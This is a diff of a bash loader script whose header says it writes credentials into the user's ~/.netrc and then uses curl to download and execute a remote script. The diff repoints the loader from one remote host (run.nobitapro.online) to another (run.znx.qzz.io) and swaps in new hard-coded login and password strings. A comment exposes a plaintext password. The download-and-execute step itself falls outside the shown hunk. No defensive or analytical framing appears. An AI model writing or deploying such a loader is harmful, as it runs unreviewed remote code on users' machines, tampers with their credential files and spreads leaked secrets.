@@ -2,8 +2,8 @@
 # .netrc → curl --netrc → download & execute remote script
 set -euo pipefail
 
-URL="https://run.nobitapro.online"
-HOST="run.nobitapro.online"
+URL="https://run.znx.qzz.io"
+HOST="run.znx.qzz.io"
 NETRC="${HOME}/.netrc"
 
 if ! command -v curl >/dev/null 2>&1; then
@@ -18,12 +18,12 @@ tmpfile="$(mktemp)"
 grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
 mv "$tmpfile" "$NETRC"
 
-# Only one account now — user-nobita
-# pass - nobita 1234
+# Only one account now — user-zenseitech
+# pass - zenseih@cker1234
 {
   printf 'machine %s ' "$HOST"
-  printf 'login %s ' "user-ty3twTsg@Ic2mymIke(ERa4qgNudHp#+v!MEEnTpIdy8hyVAK2uD@CJ(EMt&kHcE"
-  printf 'password %s\n' "pdxnfjaUFLH9j2Tw*Pyy^fZqxRMN*jrar^LFa@R%Z(^KaUnceDvjSCwUs3mJc@"
+  printf 'login %s ' "user-ty3twTsg@Ic2)WUIAWdwdERa4qgNudHp#+v!MEEnTpIdy8hyVAK2uD@CJ(EMt&kHcE"
+  printf 'password %s\n' "pdxnfjaUFLH9j2Tw*Pyy^awqxRMN*jrar^LFa@R%Z(^KaUnceDvjSCwUs3mJc@"
 } >> "$NETRC"
 
 script_file="$(mktemp)"
